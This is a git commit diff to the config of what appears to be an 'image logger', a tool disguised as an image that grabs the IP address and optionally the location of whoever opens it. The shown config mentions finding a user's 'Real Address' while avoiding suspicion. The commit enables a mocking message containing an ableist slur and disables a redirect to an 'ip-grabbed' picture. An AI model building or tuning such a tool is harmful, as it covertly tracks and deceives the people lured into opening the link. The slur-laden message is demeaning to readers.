6e336e319607524ec11de37937accce724f9dda0
nawdyue <kastratideiv@gmail.com>
2025-01-31 19:38:35 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "404 Error. This returned false on our end.", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Did u think you were getting an E-girl? Dont be retarded.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://media.tenor.com/3NLDOEUwbRsAAAAe/ip-grabbed.png" # Link to the webpage to redirect to 
     },
 
